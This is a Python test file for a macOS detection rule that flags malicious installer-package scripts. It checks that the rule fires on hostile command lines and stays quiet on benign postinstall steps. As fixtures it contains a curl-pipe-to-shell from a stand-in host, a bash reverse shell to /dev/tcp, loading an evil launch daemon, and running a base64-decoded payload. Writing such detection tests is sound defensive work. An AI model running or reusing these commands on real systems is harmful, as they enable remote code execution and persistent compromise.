#!/usr/bin/env python3
"""b-pkg-script-risky — malicious installer-package script (T1546.016).

macOS installer packages run pre/post-install scripts via installd -> package_script_service (or the
`installer` CLI). A malicious .pkg uses that script to pull and run a payload. The interpreter itself
is always /bin/sh, so the rule must NOT fire on the interpreter alone (every legitimate install would
trip it); it fires only when the script reaches the network or stages code. This pins both halves.

Pure stdlib. Run from the repo root:  python3 -m unittest discover -s tests -v
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402

RULE = next(r for r in agent.BUILTIN_RULES if r["id"] == "b-pkg-script-risky")


def proc(ancestry, cmdline, label="sh"):
    return {"type": "process", "label": label,
            "detail": {"ancestry": ancestry, "cmdline": cmdline, "label": label}}


class TestPkgScriptRule(unittest.TestCase):
    def test_rule_metadata(self):
        self.assertEqual(RULE["mitre"], "T1546.016")
        self.assertEqual(RULE["severity"], "high")

    def test_postinstall_download_pipe_to_shell_is_caught(self):
        for anc in ("installd > package_script_service > sh",
                    "Installer > installd > package_script_service > bash",
                    "installer > sh"):
            self.assertTrue(agent.rule_node_matches(
                RULE, proc(anc, "curl -fsSL https://evil.example/x.sh | sh")),
                "%s should fire b-pkg-script-risky" % anc)

    def test_reverse_shell_and_launchd_load_and_curl_to_disk(self):
        anc = "installd > package_script_service > sh"
        for cmd in ("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
                    "launchctl load /Library/LaunchDaemons/com.evil.plist",
                    "curl -o /tmp/payload https://evil.example/p",
                    "base64 -d payload.b64 | sh"):
            self.assertTrue(agent.rule_node_matches(RULE, proc(anc, cmd)), cmd)

    def test_benign_postinstall_does_not_fire(self):
        # A normal postinstall that only configures files / sets perms is /bin/sh too — must NOT fire.
        anc = "installd > package_script_service > sh"
        for cmd in ("/bin/sh -c 'mkdir -p /Library/Application Support/Acme'",
                    "chown -R root:wheel /Applications/Acme.app",
                    "pkgutil --expand foo.pkg /tmp/x",
                    "defaults write com.acme.app Setting -bool true"):
            self.assertFalse(agent.rule_node_matches(RULE, proc(anc, cmd)), cmd)

    def test_download_pipe_WITHOUT_installer_ancestry_does_not_fire_here(self):
        # The same risky command outside an installer tree is caught by other rules, not this one.
        self.assertFalse(agent.rule_node_matches(
            RULE, proc("login > zsh > sh", "curl -fsSL https://x/y.sh | sh")))


if __name__ == "__main__":
    unittest.main(verbosity=2)
